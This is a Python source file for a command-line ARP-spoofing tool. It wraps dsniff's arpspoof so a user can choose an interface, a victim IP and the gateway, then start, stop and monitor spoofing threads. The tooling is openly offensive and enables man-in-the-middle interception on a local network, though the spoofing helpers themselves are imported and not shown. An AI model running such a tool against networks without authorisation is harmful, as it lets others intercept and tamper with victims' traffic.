from language.language import NO_INTERFACES_WERE_FOUND
from language.language import FOR_ARPSPOOF_CHECK_THIS
from language.language import SELECT_AN_INTERFACE
from language.language import SELECT_THE_GATEWAY
from language.language import CONFIRM_INTERFACE
from language.language import SELECT_AN_OPTION
from language.language import SELECT_A_VICTIM
from language.language import THREAD_CREATED
from language.language import THREAD_V_G
from language.language import STARTING
from language.language import STOPPING
from language.language import WELCOME
from language.language import MENU_1
from language.language import MENU
from tools.util import retrieve_interfaces
from tools.util import create_options_list
from tools.util import run_single_arpspoof
from tools.util import check_arpspoof
from tools.util import choose_option
from tools.util import choose_ip
from tools.config_manager import SYS_NAME
from time import sleep

print(WELCOME)

if not check_arpspoof():
    if SYS_NAME == "nt":
        print(FOR_ARPSPOOF_CHECK_THIS % "https://github.com/alandau/arpspoof")
    elif SYS_NAME != "Darwin":
        print(FOR_ARPSPOOF_CHECK_THIS % "https://command-not-found.com/dsniff")
    else:
        print(FOR_ARPSPOOF_CHECK_THIS % "https://ports.macports.org/port/dsniff/")
    exit(0)

arpspoof_threads = list()
WORKING_INTERFACE = None

while True:
    if not arpspoof_threads:
        print(MENU)
        print(SELECT_AN_OPTION)
        option = choose_option(["1", "2", "E"])
    else:
        print(MENU_1)
        print(SELECT_AN_OPTION)
        option = choose_option(["1", "2", "3", "E"])

    if option == "E" and not arpspoof_threads:
        break
    elif option == "E" and arpspoof_threads:
        for thread in arpspoof_threads:
            if not thread.terminated:
                print(STOPPING + THREAD_V_G % (thread.victim, thread.gateway))
                thread.stop()
                arpspoof_threads.remove(thread)
        break

    if WORKING_INTERFACE is None:
        INTERFACES = retrieve_interfaces()
        WORKING_INTERFACE = None

        if not INTERFACES and SYS_NAME != "nt":
            print(NO_INTERFACES_WERE_FOUND)
            break
        elif SYS_NAME != "nt":
            printable_list, options, options_values = create_options_list(INTERFACES)
            confirm_interface = False
            while not confirm_interface:
                print(printable_list)
                print(SELECT_AN_INTERFACE)
                WORKING_INTERFACE = choose_option(options, options_values)
                print(CONFIRM_INTERFACE % WORKING_INTERFACE)
                confirm_interface = choose_option(["1", "2"], [True, False])

    if option == "1" and not arpspoof_threads:
        victim = choose_ip(SELECT_A_VICTIM, WORKING_INTERFACE)
        gateway = choose_ip(SELECT_THE_GATEWAY, WORKING_INTERFACE)
        arpspoof_threads.append(run_single_arpspoof(victim, gateway, WORKING_INTERFACE))
        print(THREAD_CREATED)
    elif option == "1" and arpspoof_threads:
        for thread in arpspoof_threads:
            if not thread.terminated:
                print(STARTING + THREAD_V_G % (thread.victim, thread.gateway))
                thread.start()
            else:
                arpspoof_threads.remove(thread)

    if option == "2" and not arpspoof_threads:
        print("WIP")
    elif option == "2" and arpspoof_threads:
        for thread in arpspoof_threads:
            if not thread.terminated:
                print(STOPPING + THREAD_V_G % (thread.victim, thread.gateway))
                thread.stop()
                arpspoof_threads.remove(thread)
                sleep(1)

    if option == "3":
        try:
            while True:
                msg = ""
                for thread in arpspoof_threads:
                    msg += "\nThread %a is running: %a" % (thread.victim, thread.is_alive())
                msg += "\nPress 'control + c' to exit "
                print(msg)
                sleep(3)
        except KeyboardInterrupt:
            pass

print("Bye...")
exit(0)
